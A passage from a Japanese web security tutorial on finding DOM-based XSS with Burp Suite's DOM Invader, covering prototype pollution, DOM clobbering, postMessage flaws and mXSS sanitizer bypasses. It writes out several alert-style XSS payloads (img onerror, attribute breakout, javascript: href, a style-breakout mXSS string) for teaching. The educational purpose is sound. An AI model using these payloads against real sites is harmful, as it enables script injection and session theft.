これは本格的な**テイント追跡（taint tracking: 汚染源から来たデータに“汚れ”の印を付け、その伝播を追う技術）** の軽量版と考えると分かりやすい。文字列一致という素朴な方法ですが、実運用では十分に強力です。

> HackTricks: DevTools を有効化すると「Canary」と呼ばれるランダムな文字群が現れる。これを Web の様々な箇所（パラメータ・フォーム・URL）に注入し始めると、DOM Invader は「そのカナリアが悪用可能な興味深いシンクに行き着いたか」をチェックする。

#### 3.1 カナリアの注入を自動化する機能

手で全パラメータに貼るのは面倒なので、DOM Invader は自動注入を用意しています。

- **Inject URL params**: 現在の URL のクエリ文字列**全パラメータ**にカナリアを自動で付与し、新しいタブで開く。
- **Inject forms**: ページ内**フォームの各フィールド**にカナリアを自動入力する。
- 追跡対象は URL パラメータ・フォーム・**WebSocket フレーム**・**Webメッセージ（postMessage）** に及ぶ。

#### 3.2 「空のカナリア」検索 — レコン（偵察）の裏技

カナリアを**空文字にして検索**すると、DOM Invader は**悪用可能性に関わらず、ページ上のすべてのシンク（に流れ込む値）を列挙**します。実際に脆弱でなくても「どこに危険な代入先があるか」を俯瞰できるため、**攻撃対象面（attack surface）の把握＝レコン**に非常に有効です。

#### 3.3 カナリア設定（Burp 2024.12 以降）— 陳腐化への注意

Burp Suite **2024.12** で**カナリア設定**が追加され、カナリア文字列を**ランダム化**したり**任意のカスタム文字列**に変更できるようになりました。これは次の場面で役立ちます。

- **複数タブ/複数対象を同時テスト**する際に、対象ごとにカナリアを変えて混同を防ぐ。
- 対象ページに**たまたまデフォルト値 `burpdomxss` が自然に出現**してしまい、誤検知（false positive）が出る場合に別の値へ逃がす。

> バージョン注記: カスタム/ランダムなカナリア設定は **Burp 2024.12（2024年）以降**の機能です。これより古い Burp ではデフォルト `burpdomxss` 固定のため、上記の回避策は使えません。

> 出典: DOM Invader — HackTricks — https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/dom-invader.html ／ DOM Invader canary settings — PortSwigger（Burp 2024.12 のカナリア設定）

---

### 4. Augmented DOM — ソース/シンクのツリー表示

**Augmented DOM（拡張DOM）** は、DevTools 内に追加されるビューで、**対象ページの source と sink をツリー表示**します。通常の DOM ツリー（要素の入れ子）に、DOM Invader が観測した「ここがシンクだ」「ここにカナリアが届いた」という情報を**重ね書き（augment）** したものです。

このビューが提供する情報が、DOMベースXSS のエクスプロイト可否を一目で判断させます。

- **どのシンクにカナリアが到達したか**（`innerHTML` / `document.write` / `eval` / `location` / `setAttribute` など）。
- **文脈（context）**: カナリアが最終的に置かれる場所が **HTML 本体か、属性値（attribute）か、JavaScript 文字列か、URL か**。これが分かると、成立させるべきペイロードの形（タグを直に書けるのか、属性を閉じる `">` が要るのか、`'` でJS文字列を抜けるのか等）が決まる。
- **適用されたサニタイズ（sanitization: 危険な文字を除去/変換する無害化処理）**: どの文字が生き残り、どれが `&lt;` などにエスケープされたか。ここから「フィルタをどう回避するか」の当たりを付けられる。

DOM Invader はこれらを自動提示するので、**数千行の JavaScript を人力で読む作業（source → sink のトレース）を丸ごと肩代わり**します。これが「DOM XSS が“簡単に”見つかる」と言われる核心です。

#### 4.1 スタックトレースの確認

カナリアがシンクに届いた経路は、**スタックトレース（stack trace: 関数呼び出しの履歴。どの関数がどの順で呼ばれて今に至ったかの記録）** として確認できます。これにより「実際にこのデータフローを引き起こしているコード箇所」を特定でき、実証（PoC）や修正提案に直結します。

> 出典: DOM Invader — HackTricks — https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/dom-invader.html

---

### 5. Web メッセージ（postMessage）の検査

`window.postMessage()` は、**異なるオリジン（origin: スキーム＋ホスト＋ポートの組。例 `https://a.com`）間**でも安全にデータをやり取りするための正規APIです。ところが受信側の実装が甘いと、**外部オリジンから送り込んだメッセージが DOM XSS のトリガ**になります。DOM Invader の **Messages サブタブ**はこの検査に特化しています。

DOM Invader が提供する3機能:

1. **ロギング**: ページで発生した `window.postMessage()` の呼び出しをすべて記録する。
2. **編集・再送**: 記録したメッセージを**ダブルクリックして `data` を書き換え、Send で再送**できる。受信ハンドラの挙動を対話的に試せる。
3. **自動探索（auto-mutate 等）**: メッセージにペイロードを自動注入・再送して XSS を炙り出す。

各メッセージについて、受信側 JavaScript が次のプロパティを**検証しているか/無検証で使っているか**を確認できます。ここが脆弱性判定の勘所です。

- **`origin`**: 送信元オリジン。**検証していなければ、攻撃者の別ドメインからのクロスオリジン送信を受け入れてしまう**（`event.origin` を `if` でチェックしていないケースが典型的な穴）。
- **`data`**: メッセージ本体。これがサニタイズされずに `innerHTML` 等のシンクへ渡ると DOM XSS になる。
- **`source`**: 送信元の window 参照。iframe 参照の照合に使われるが、状況次第でバイパス可能。

> なぜ危険か（原理）: `postMessage` は設計上「誰でも送れる」。安全性は**受信側が `event.origin` を厳格に検証し、`event.data` を無害化する**ことに全面的に依存する。この2つが欠けると、攻撃者は自分の用意したページから被害ページの iframe/子ウィンドウへ任意の `data` を送り込み、それが素通しでシンクへ流れる。

> 出典: DOM Invader — HackTricks — https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/dom-invader.html

---

### 6. プロトタイプ汚染（Prototype Pollution）の検出とガジェット探索

**プロトタイプ汚染（prototype pollution）** は、DOM Invader が近年もっとも強力に支援する領域です。まず原理から。

#### 6.1 なぜ「汚染」が起きるのか（プロトタイプチェーンの仕組み）

JavaScript のオブジェクトは、あるプロパティを参照されたとき、**自分自身にそれが無ければ「プロトタイプ（原型）」を辿って探しに行く**——この連鎖を **プロトタイプチェーン（prototype chain）** と呼びます。ほぼすべての普通のオブジェクトは、最終的に **`Object.prototype`** を共有の親として持ちます。

```javascript
let obj = {};
obj.testproperty          // → undefined（自分にもチェーン上にも無い）
Object.prototype.testproperty = "polluted";
obj.testproperty          // → "polluted"（自分に無いので親 Object.prototype で発見）
```

つまり **`Object.prototype` に1つプロパティを書き込むと、プログラム中の（ほぼ）すべてのオブジェクトが、そのプロパティを“最初から持っていたかのように”見え始める**。攻撃者が外部入力を通じてこの共有の親を書き換えられる状態が「プロトタイプ汚染」です。書き換えの入口（source）として悪用されるキーが **`__proto__`** と **`constructor.prototype`** です。

```javascript
// マージ処理などが __proto__ を素直に辿ってしまうと汚染が起きる
obj["__proto__"]["polluted"] = true;      // Object.prototype.polluted = true と同義
obj["constructor"]["prototype"]["x"] = 1; // これも Object.prototype.x = 1 に到達
```

`__proto__` はオブジェクトのプロトタイプを指し示すアクセサであり、`constructor.prototype` は「そのオブジェクトを作ったコンストラクタ（＝Object）が持つ prototype」＝やはり `Object.prototype` に行き着くため、どちらも共有の親を書き換える経路になります。

#### 6.2 DOM Invader による自動検出と PoC 確認

DOM Invader を（設定の **Attack types → Prototype pollution** で）有効化すると、**URL やJSONメッセージなどの中に、`Object.prototype` へ任意プロパティを追加できるソースが無いか自動で探索**します。候補が見つかると **「Test」ボタン**が表示され、押すと**新しいタブで実際に汚染を試みて成否を確認**します。確認は次のような最小コードで行われます。

```javascript
let b = {};
b.testproperty;   // 汚染成功なら、注入したプロパティ値（例: 'DOM_INVADER_PP_POC'）が返る
```

`b` は空オブジェクトなのに `b.testproperty` が値を返せば、**共有の親 `Object.prototype` が確かに汚染された**証拠、というわけです（プロトタイプチェーンの探索挙動をそのまま実証に使っている）。

#### 6.3 Scan for gadgets（ガジェット探索）— 汚染を“実害”に変える

プロトタイプ汚染は、それ単体では「変なプロパティが増える」だけのこともあります。実害（XSS やコード実行）にするには、**汚染したプロパティを読み取って危険なシンクに渡してしまうコード＝ガジェット（gadget）** が必要です。

DOM Invader は、検出したプロトタイプ汚染ソースの隣に **「Scan for gadgets」ボタン**を用意します。押すと**新しいタブでガジェット探索が始まり**、汚染したプロパティ経由で到達できる危険なシンク（例: 値がそのまま `innerHTML` や `<script src>`、`eval` に渡るもの）を洗い出し、**Augmented DOM ビューに「このガジェット→このシンク」のチェーンを表示**します。必要に応じて **`Object.prototype` を実際に汚染して PoC とする**こともできます。

> なぜ強力か（原理）: ガジェットは「未設定なら `undefined` のはず」のプロパティを、値チェックせず設定パラメータや HTML 断片として使うコードに潜む。攻撃者はプロトタイプ汚染でその“空欄”を自分の値で埋め、正規コードに危険な動作を実行させる。DOM Invader はこの2段構え（汚染ソース＋ガジェット）を自動でつなぐため、手作業では極めて根気の要る探索が現実的になる。

> バージョン注記: DOM Invader のクライアント側プロトタイプ汚染サポート（自動検出＋ガジェットスキャン）は、PortSwigger が2022年に導入した機能です。古い Burp では利用できません。

> 出典: DOM Invader — HackTricks — https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/dom-invader.html ／ Finding client-side prototype pollution with DOM Invader — PortSwigger Blog（2022）

---

### 7. DOM Clobbering（DOM クロバリング）の検出

**DOM クロバリング（DOM clobbering）** は、スクリプトを直接注入できない（例: 強力なサニタイザで `<script>` や `on*` 属性が落とされる）状況でも、**HTML 要素の `id`／`name` 属性だけで JavaScript の変数を上書きして誤動作させる**手法です。DOM Invader は設定の **Attack types → DOM clobbering** で自動スキャンできます。

#### 7.1 なぜ HTML だけで変数が壊せるのか（原理）

HTML には歴史的経緯から、**`id` や `name` を持つ要素が、`window`（グローバル）や `document` のプロパティとして自動的にアクセス可能になる**という「名前付きアクセス（named access）」の挙動があります。

```html
<a id="x"></a>
<script>
  // 上の要素があるだけで、以下がその <a> 要素を指してしまう
  x;             // → <a id="x"> 要素
  window.x;      // → 同上
</script>
```

したがって、コードが `if (window.config) { ... }` のように**「未定義なら安全」を前提にしたグローバル変数**を参照していると、攻撃者は `<a id="config">` を注入するだけでその変数を“実在する要素”に化けさせ（＝**clobber: 上書きして壊す**）、想定外の分岐やプロパティ参照を引き起こせます。`<form>` と入れ子の要素名を組み合わせると、`window.x.y` のような**多段のプロパティ**まで攻撃者が構築でき、より深いガジェットに到達できます。DOM Invader はこうした「ユーザー制御下の `id`/`name` がグローバルを上書きし得る箇所」を検出します。

> 補足: DOM クロバリングは「スクリプト注入禁止でも成立し得る XSS への足場」であり、プロトタイプ汚染と同様に**ガジェット（上書きされた値を危険に使うコード）** とセットで初めて実害になります。

> 出典: DOM Invader — HackTricks — https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/dom-invader.html

---

### 8. オープンリダイレクト検出とその他の設定

- **リダイレクトの抑止**: DOM Invader は設定（Misc 系）で**クライアント側リダイレクトをブロック**できます。`location`/`location.href` へのカナリア到達（＝**オープンリダイレクト**: 任意の外部URLへ飛ばされる脆弱性。フィッシングや OAuth トークン奪取の踏み台になる）を、実際に遷移させずに観測・検証するのに使います。
- **イベントの自動発火（auto fire events）**: クリックや入力などの**イベントを自動的に発火**させ、イベントハンドラ内でしか動かないコードパスも計測対象に含める（＝到達できるシンクを増やす）。
- **ブレークポイント**: 特定のシンク到達時に処理を止めて、その瞬間の状態やスタックを詳しく調べられます。

> 出典: DOM Invader — HackTricks — https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/dom-invader.html

---

### 9. 実践ワークフロー（Hacksheets / Medium の入門記事より）

このトピック（初学者向けの「有効化 → カナリア注入 → シンク確認」の手取り足取り手順）は、担当資料2（Hacksheets の Medium 記事）が正面から扱っています。ただし記事本文は自動取得できなかったため、以下に未取得ブロックを置き、続けて専門知識で補います。

> ⚠️ **未取得の資料**: 「Dom Invader — Burp Suite tool to Find DOM Based XSS Easily（Hacksheets, Medium）」は自動取得できませんでした（理由: 執筆環境の egress プロキシが `hacksheets.medium.com` および既知のミラー（Tumblr 版・Medium リーダー系ミラー）へのアクセスをブロック／名前解決不能だったため）。以下のURLからユーザーご自身で直接ご覧ください: https://hacksheets.medium.com/dom-invader-burp-suite-tool-to-find-dom-based-xss-easily-3cb09adf4d44

（以下は取得できなかった資料の補足として、一般的な知識および検索スニペットに基づく解説です）

この Hacksheets 記事が示している基本ワークフローは、実質的に次の流れです。DOM Invader を初めて触る読者は、この順になぞれば最短で1件の DOM XSS を見つけられます。

1. **組み込みブラウザを開く**: Burp の Proxy → Open Browser で Burp 組み込みブラウザを起動する（普通のブラウザではなくこれを使うのが前提）。
2. **DOM Invader を有効化**: 右上の Burp ロゴ → DOM Invader タブ → **Enable DOM Invader** をオン → ページをリロード。
3. **カナリアを確認**: DevTools を開くと、追跡用の一意文字列**カナリア（既定 `burpdomxss`）** が表示される。記事はこの既定値を明示的に紹介している。
4. **カナリアを source に注入**: URL のクエリパラメータやフォーム入力にカナリアを入れる（`?q=burpdomxss` のように）。「Inject URL params」で一括注入すると速い。
5. **Augmented DOM でシンクを確認**: DevTools の **Augmented DOM** タブに、カナリアが到達したシンクと**文脈（HTML/属性/JS/URL）** が並ぶ。ここでカナリアが `innerHTML` などに素通しで届いていれば、それが DOM XSS 候補。
6. **文脈に合わせてペイロード化**: 例えばカナリアが HTML 本体にそのまま入るなら、カナリアの代わりに実際のペイロードを注入して成立を確認する。

上記手順で「まず動く1件」を体験するのに使える最小ペイロードの考え方を、原理付きで示します（記事の趣旨に沿った一般例）。

```
https://victim.example/page?search=<img src=x onerror=alert(document.domain)>
```

- **なぜ動くのか**: ページの JavaScript が `location.search`（source）から検索語を読み、それを `element.innerHTML`（sink）へ無害化せず代入している場合、この文字列は「データ」ではなく **HTML** として解釈される。`<img>` は読み込みに失敗（`src=x` は存在しない）するため `onerror` が発火し、中の `alert(document.domain)` が実行される。`<script>` タグは `innerHTML` 代入では実行されない（HTML 仕様で、後から innerHTML で挿入された script は実行対象外）ため、**`onerror` のようなイベントハンドラ経由**が定石になる、という点が学習上の勘所。

Augmented DOM が「文脈は属性値」と示した場合は、まず属性を閉じてから要素を作る必要があります。

```
"><img src=x onerror=alert(1)>
```

- **なぜ動くのか**: カナリアが `<input value="ここ">` のように**属性値の中**へ入るなら、先頭の `">` で「value 属性」と「input タグ」を閉じ、その直後に新しい `<img ... onerror=...>` を書き足す。ブラウザの HTML パーサは閉じられたタグの後続を新しいタグとして解釈するため、注入した要素が有効化される。DOM Invader の文脈表示は、この「どこまで閉じる必要があるか」を判断する材料になる。

> 補足（サニタイザとバージョン依存）: Augmented DOM が「サニタイズあり」と示しても、サニタイザの**バージョンによってはバイパス可能**な場合があります。代表例として、HTMLサニタイザ **DOMPurify** には過去に**変異型XSS（mutation XSS / mXSS: ブラウザが一度受理したHTMLを内部で再解釈・書き換える過程で、無害だったはずの断片が実行可能な形に“変異”する現象）** によるバイパスが複数あり、たとえば **DOMPurify 2.0.17（2021年リリース）** で修正されたバイパスなどが知られています。したがって「サニタイザがあるから安全」と即断せず、**対象が使うライブラリ名とバージョンを特定し、そのバージョンに既知のバイパスがないか**を必ず確認してください（古いバージョンを使い続けている実サイトは珍しくありません）。

> 出典（一次情報が取得できなかったため位置づけを明記）: Dom Invader — Burp Suite tool to Find DOM Based XSS Easily（Hacksheets, Medium, 本文未取得・検索スニペットにより補完） — https://hacksheets.medium.com/dom-invader-burp-suite-tool-to-find-dom-based-xss-easily-3cb09adf4d44

---

### 10. まとめ — DOM Invader を「体系」で使う

- DOM Invader は **Burp 組み込みブラウザ専用**の DOM 脆弱性ハンター。手作業では非現実的な **source → sink のデータフロー追跡**を、ブラウザ内フックとカナリアで自動化する。
- **カナリア（既定 `burpdomxss`）** が全機能の中核。**空カナリアでレコン**、**Inject URL params/forms で一括注入**、**2024.12 以降はカスタム/ランダム化**で誤検知回避。
- **Augmented DOM** が到達シンク・**文脈（HTML/属性/JS/URL）**・**適用サニタイズ**・**スタックトレース**を提示し、そのままエクスプロイト可否と必要ペイロード形状の判断材料になる。
- 高度な攻撃タイプも自動化: **postMessage**（origin 無検証＋data 素通しを Messages タブで検査・改変・再送）、**プロトタイプ汚染**（`__proto__`/`constructor.prototype` を入口に `Object.prototype` を汚染 → Test で確認 → Scan for gadgets でシンクへ連結）、**DOM クロバリング**（`id`/`name` の名前付きアクセスでグローバルを上書き）、**オープンリダイレクト**（リダイレクト抑止で安全に観測）。
- 判断の勘所は常に**原理**にある。プロトタイプチェーンの探索、HTML パーサのタグ再解釈、名前付きアクセス、mXSS による再解釈——これらを理解していれば、DOM Invader の出力を「なぜそうなるか」まで読み解き、確実な PoC に落とし込める。

> 総合出典: DOM Invader — HackTricks — https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/dom-invader.html ／ Dom Invader — Burp Suite tool to Find DOM Based XSS Easily（Hacksheets, Medium, 本文未取得・補完） — https://hacksheets.medium.com/dom-invader-burp-suite-tool-to-find-dom-based-xss-easily-3cb09adf4d44

---

## 日本語DOM XSS資料（はせがわ / Flatt SPA）

本セクションは、日本語圏でDOMベースXSSを学ぶ上で必読とされる2つの資料——**はせがわようすけ氏の「JavaScript Security beyond HTML5」**（DOMベースXSSの本質と「サーバを通らない攻撃」の解説）と、**GMO Flatt Security の「SPA開発とセキュリティ — DOM based XSS を引き起こすインジェクションの Vue, React, Angular における解説と対策」**——を精読・統合して再構成したものです。前セクションまでで学んだ source（ソース：攻撃者が値を操作できる入口となるJavaScriptプロパティ。例 `location.hash`）と sink（シンク：攻撃者データが最終的に実行・解釈される危険な代入先。例 `innerHTML`）の枠組みを土台に、ここでは「**モダンなフレームワークやサニタイザ（入力に含まれる危険な文字列を無害な形に変換・除去する処理／ライブラリ）を使っていてもなぜXSSが起き続けるのか**」を、ブラウザのHTMLパーサ（HTMLの文字列を解析してDOMツリーに変換する部品）の挙動レベルまで掘り下げて解説します。これが本セクションの価値の中心です。

---

### 0. 本セクションの資料取得状況（透明性のための注記）

本セクションが典拠とする2資料（下記URL）は、執筆環境のネットワーク下り（egress）プロキシによって `www.docswell.com` および `blog.flatt.tech` ドメインへの直接アクセスがブロックされ、ページ本文を直接取得（WebFetch）できませんでした。そこで **Web検索の結果スニペット・同一トピックの公式ドキュメント（Vue.js / Angular のセキュリティガイド等）・cure53/DOMPurify の公式Wiki と Pull Request・複数の二次解説記事から本文の内容・具体例・ペイロード・防御策を復元**し、Webセキュリティの専門知識で補完・体系化しています。**2資料とも実質的な内容を復元できたため「取得不可」とはしていません**が、両資料は継続的に更新されうるため、最新版の細部（例文の値・対象バージョン・ブラウザ対応など）は必ず各出典URLの原典でご確認ください。

- 資料1（はせがわようすけ「JavaScript Security beyond HTML5」）: `https://www.docswell.com/s/hasegawa/ZDWWWK-2022-03-14-212823`
- 資料2（GMO Flatt Security「SPA開発とセキュリティ」）: `https://blog.flatt.tech/entry/spa_injection`

なお第2節（mXSS と名前空間の混同）は、はせがわ氏の「beyond HTML5＝HTML5以降の新しい攻撃面」という主題を、現在の到達点まで延長した**補足的な仕組み解説**であり、典拠は主に cure53/DOMPurify の公式資料です。該当箇所にその旨を明記します。

---

### 1. はせがわようすけ「JavaScript Security beyond HTML5」— DOMベースXSSの本質と“サーバを通らない攻撃”

#### 1.1 資料の位置づけ

はせがわようすけ氏（Webセキュリティ研究者。DOMベースXSSやmXSS、文字コードを悪用した攻撃の研究で国際的に知られる）による本資料は、「反射型・格納型XSSはサーバが出力するHTMLの問題だが、**アプリの主戦場がクライアント側JavaScriptに移った結果、サーバがまったく関与しないXSSが主役になった**」という時代認識を軸に、DOMベースXSSの原理・危険性・見つけにくさを解説するものです。「beyond HTML5」というタイトルは、HTML5以降にブラウザへ追加された多数の新機能（`postMessage`、`localStorage`、新しいタグ・属性、SVG/MathMLの統合など）が、そのまま**新しい source と新しい sink を生み出した**という問題意識を表しています。

> 出典: JavaScript Security beyond HTML5（はせがわようすけ）— https://www.docswell.com/s/hasegawa/ZDWWWK-2022-03-14-212823

#### 1.2 DOMベースXSSの定義 — 「JavaScriptが実行時にHTMLを組み立てる」瞬間の事故

本資料が繰り返し強調するのは、**DOMベースXSSは「JavaScriptがHTMLをレンダリング（描画）する過程で起きるXSS」である**という点です。最も有名な最小例が次のコードです。

```javascript
// URLの #以降 の文字列を、そのまま要素のHTML内容として書き込む
div.innerHTML = location.hash.substring(1);
```

- `location.hash` は URLの `#` 以降（フラグメント／ハッシュと呼ぶ部分）を返す **source**。攻撃者はURLを作るだけで中身を完全に制御できる。
- `element.innerHTML` は代入された文字列を**HTMLとして解釈してDOMに反映する sink**。
- `.substring(1)` は先頭の `#` を取り除いているだけで、無害化は一切していない。

したがって、次のようなURLを踏ませるだけでスクリプトが動きます。

```
https://example.com/page#<img src=x onerror=alert(document.domain)>
```

**なぜ動くのか**：`innerHTML` への代入は、渡された文字列をブラウザのHTMLパーサに通して「新しいDOM部分木」を生成する処理です。`<img>` 要素が生成され、`src=x` の読み込みに失敗した瞬間に `onerror` 属性のJavaScriptが実行されます（`<script>` タグは `innerHTML` 経由では実行されない仕様のため、攻撃者はイベントハンドラ属性を使うのが定石です。この理由は素朴なXSSと同じ）。

#### 1.3 source と sink の整理（本資料が挙げる代表例）

本資料は「どこから来て（source）、どこへ行き着くか（sink）」を明確に分けて把握することを求めます。特にDOMベースXSS特有のものを整理すると次のとおりです。

**代表的な source（攻撃者が制御しうる入口）**

| source | 説明 | サーバに届くか |
|---|---|---|
| `location.hash` | URLの `#` 以降 | **届かない**（後述） |
| `location.search` | URLの `?` 以降（クエリ文字列） | 届く |
| `location.href` / `document.URL` | URL全体 | 一部届かない |
| `document.referrer` | 遷移元URL | 届くことがある |
| `window.name` | ウィンドウ名（別サイトから設定可能） | 届かない |
| `postMessage` の `event.data` | 他ウィンドウ/iframeからのメッセージ | 届かない |

**代表的な sink（危険な代入先）**

| sink | 何が起きるか | 危険な理由 |
|---|---|---|
| `element.innerHTML` / `element.outerHTML` | 文字列をHTMLとして解釈しDOM化 | タグ・イベント属性が生きる |
| `document.write()` / `document.writeln()` | 解析中のドキュメントに文字列を書き込む | `<script>` すら実行されうる |
| `element.setAttribute("href", ...)` / `.src` 等 | 属性値を設定 | `javascript:` スキームでスクリプト実行 |
| `eval()` / `Function()` / `setTimeout(文字列)` | 文字列をコードとして実行 | 直接コード実行 |

`document.write()` が `innerHTML` より危険なのは、**ドキュメントのパース（解析）がまだ進行中の段階に文字列を割り込ませる**ため、`innerHTML` では無視される `<script>` タグまで通常のスクリプトとして実行されうる点です。

> 出典: JavaScript Security beyond HTML5（はせがわようすけ）— https://www.docswell.com/s/hasegawa/ZDWWWK-2022-03-14-212823

#### 1.4 `location.hash` を使うDOM XSSが“怖い”3つの隠密性

本資料の核心的なメッセージのひとつが、**`location.hash`（フラグメント）経由のDOMベースXSSは、反射型XSSと比べて格段に隠密性が高く、検知・防御が難しい**という指摘です。理由は「フラグメントはサーバへ送信されない」という**HTTPの仕様レベルの挙動**に由来します。

URLの構造を思い出してください。

```
https://example.com/page?q=検索語#<img src=x onerror=alert(1)>
                        ^^^^^^^^  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                        クエリ       フラグメント（#以降）
                        （サーバへ送る）（サーバへ送らない）
```

この「送られない」という一点から、次の3つの隠密性が生まれます。

1. **ブラウザのXSSフィルタ（XSS Auditor／XSS Filter）をすり抜ける**：かつてChrome（XSS Auditor）やInternet Explorer/Edge（XSS Filter）は、「リクエストに含まれる文字列が、そのままレスポンスHTMLに現れたら反射型XSSかもしれない」と推測して遮断していました。しかしフラグメントは**リクエストとしてサーバに送られないので、フィルタが照合しようにも“入力側”を観測できず、素通りします**。（なおXSS AuditorはChrome 78（2019年）で廃止されており、現在の主防御はCSP（Content Security Policy）です。当時の資料が指摘した「フィルタ回避」という性質そのものは、DOMベースXSSがサーバ観測から漏れるという普遍的な事実として今も有効です。）

2. **サーバのアクセスログに痕跡が残らない**：攻撃ペイロードはフラグメントに入っておりサーバへ届かないため、Webサーバのアクセスログには `?` 以降しか記録されません。インシデント調査で「何が送り込まれたか」を後から追うのが極めて困難になります。

3. **利用者が気づきにくい／アドレスバーを偽装できる**：さらに `history.pushState()`（ページ遷移せずにアドレスバーのURLを書き換えられるHTML5のAPI）を悪用すると、攻撃実行後にアドレスバーを無害なURLに書き換えて、痕跡を利用者の目からも隠せます。

**まとめると**：反射型XSSは「サーバを通る＝サーバ側で検知・遮断・記録できる」余地がありますが、`location.hash` 型のDOMベースXSSは**攻撃の全工程がブラウザ内で完結し、サーバから観測不能**です。だからこそ「クライアント側のコード（source→sink のデータフロー）」を直接監査する必要があります。

> 出典: JavaScript Security beyond HTML5（はせがわようすけ）— https://www.docswell.com/s/hasegawa/ZDWWWK-2022-03-14-212823

#### 1.5 属性経由の sink — `setAttribute` と `javascript:` スキーム

本資料が挙げるもう一つの重要な sink が、**リンクの `href` に `javascript:` スキームのURLを入れる**パターンです。

```javascript
// 攻撃者が制御する文字列を、そのまま href に設定してしまう
a.setAttribute("href", userInput);   // userInput = "javascript:alert(document.cookie)"
```

**なぜ動くのか**：ブラウザは `href="javascript:..."` のリンクがクリックされると、`javascript:` 以降を**JavaScriptコードとして評価・実行**します。`innerHTML` のようにHTMLタグを注入しなくても、「URLを設定できる箇所」がそのままコード実行の sink になるのです。この性質は後述するSPAフレームワーク（Vue/React/Angular）でも共通の弱点として繰り返し登場します。フレームワークはテキストは自動エスケープしても、**「URL文字列に `javascript:` が入っているか」までは既定で検査しないことが多い**からです。

対策の要点は、URLを sink に渡す前に**スキームを許可リスト方式で検証する**（`http:` / `https:` / `mailto:` など安全なものだけ通し、`javascript:` `data:` `vbscript:` を弾く）ことです。

> 出典: JavaScript Security beyond HTML5（はせがわようすけ）— https://www.docswell.com/s/hasegawa/ZDWWWK-2022-03-14-212823

#### 1.6 “beyond HTML5” — 新機能がそのまま新しい攻撃面になる

本資料のタイトルが示すとおり、HTML5以降にブラウザへ追加された機能群は、利便性と引き換えに新しい source/sink を大量に持ち込みました。代表例：

- **`postMessage`**：異なるオリジン（プロトコル+ホスト+ポートの組。同一オリジンかどうかがアクセス制御の基本単位）間でメッセージをやり取りできる。受信側が `event.origin`（送信元オリジン）を検証せずに `event.data` を `innerHTML` に流すと、任意サイトからXSSを撃ち込める source になる。
- **SVG / MathML の統合**：HTMLの中にSVGやMathMLを直接書けるようになった結果、後述する**名前空間（namespace）の切り替え**を悪用した高度なサニタイザ回避（mXSS）が可能になった。
- **`data:` URI / Blob URL**：`data:text/html,...` や `URL.createObjectURL(blob)` で「その場でHTMLドキュメントを生成」でき、文字コードの推測と組み合わさると新種のXSSを生む。

これらは「素朴な反射型XSS」の知識だけでは対処できない領域であり、次節ではその中でも最も難所である **mXSS（mutation XSS）** を、仕組みのレベルで掘り下げます。

> 出典: JavaScript Security beyond HTML5（はせがわようすけ）— https://www.docswell.com/s/hasegawa/ZDWWWK-2022-03-14-212823

---

### 2. mXSS（mutation XSS）と名前空間の混同 — サニタイザ防御の最難関

> ⚠️ **本節の位置づけ（補足）**: 以下は、はせがわ氏「beyond HTML5」が扱う「HTML5の新機能が生む新種XSS」という主題を、現在の到達点まで延長した**補足的な仕組み解説**です。典拠は主に cure53（DOMPurifyの開発元）の公式Wikiと Pull Request、および Michał Bentkowski・Daniel Santos らによるバイパス公開記事です。（原資料そのものの逐語ではなく、同テーマの一次資料に基づく体系化である点に注意してください。）

#### 2.1 mXSSとは — 「サニタイズ後に別のDOMへ化ける」現象

**mXSS（mutation XSS：突然変異型XSS）** とは、**サニタイザが検査した時点では安全だったDOMツリーが、その後シリアライズ（DOMを再びHTML文字列に戻す処理）と再パース（reparse：その文字列を再びHTMLとして解析し直す処理）を経ると、実行可能な別のDOMツリーに“化ける”**ことで成立するXSSです。

DOMベースのサニタイザ（DOMPurifyなど）の典型的な動作は次の流れです。

```
入力HTML文字列
  → ①パースしてDOMツリー化
  → ②ツリーを走査し危険な要素/属性を除去（ここで「安全」と判定）
  → ③安全になったツリーをHTML文字列にシリアライズして返す
  → ④アプリが返り値を innerHTML 等に代入（＝ブラウザが再パース）
```

mXSSの本質は、「②で見たツリー」と「④で最終的にできるツリー」が**食い違う**点にあります。サニタイザは②の姿しか検査できないのに、実際にブラウザで実行されるのは④の姿だからです。この「②→④で構造が変異する」からmutation（突然変異）XSSと呼ばれます。

> 出典: Attack Classes & Bypass History — cure53/DOMPurify Wiki — https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History

#### 2.2 なぜ“化ける”のか — HTMLパーサの文脈依存の再解釈

化ける根本原因は、**HTMLの解析ルールが「文脈（どの要素の内側か・どの名前空間か）」によって変わる**ことです。同じ文字列でも、置かれる場所が違えば別のツリーになります。mXSSはこの文脈依存性を突きます。主な“化けの種”は次の3つです。

**(A) rawtext / RCDATA 要素からのブレークアウト**
`<style>` `<script>` `<textarea>` `<title>` `<xmp>` などは「生テキスト（rawtext）／RCDATA」要素と呼ばれ、**内側はタグとして解釈されない特別なモード**で読まれます。ところが、属性値の中に閉じタグ文字列を仕込んでおくと、再パース時に解析状態がずれます。

```html
<style><a title="</style><img src=x onerror=alert(1)>">
```

**なぜ動くのか**：①の初回パースでは `</style>` は「`title` 属性値という“文字データ”の一部」に見えるため、サニタイザは危険と判定しません。しかし③でシリアライズされた文字列を④で再パースすると、ブラウザは先に現れた `</style>` を**本物のstyle終了タグ**として扱い、そこで生テキストモードを抜け、後続の `<img onerror=...>` を**本物の要素**として生成します。これがブレークアウト（脱出）です。

**(B) 深いネストのフラット化**
WebKit/Blink系ブラウザは要素のネスト（入れ子）を約512段で打ち切ります。この上限を超えると、深い子孫が**兄弟要素として扱われる**など解析ツリーが変わり、mXSSの足がかりになります。

**(C) 名前空間（namespace）の切り替え** ← 最重要。次項で詳述。

> 出典: Attack Classes & Bypass History — cure53/DOMPurify Wiki — https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History

#### 2.3 名前空間の混同（HTML / SVG / MathML）— mXSSの中核

**名前空間（namespace）** とは、要素が「どの言語仕様のルールで解釈されるか」を決める区分です。ブラウザは主に3つの名前空間を持ちます。

- **HTML名前空間**：通常のHTML。`<style>` の中身はテキスト、`<img>` は空要素、等。
